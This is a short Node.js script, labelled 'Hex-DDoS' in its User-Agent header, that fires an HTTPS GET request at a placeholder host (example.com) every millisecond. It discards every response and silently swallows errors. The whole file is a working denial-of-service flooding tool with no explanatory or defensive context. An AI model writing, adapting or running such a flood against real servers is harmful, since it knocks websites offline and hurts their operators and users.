
const https = require('https');
const options = {
  hostname: 'example.com',
  port: 443,
  path: '/',
  method: 'GET',
  headers: {'User-Agent': 'Hex-DDoS'}
};
setInterval(() => {
  const req = https.request(options, res => {
    res.on('data', d => {});
  });
  req.on('error', error => {});
  req.end();
}, 1);
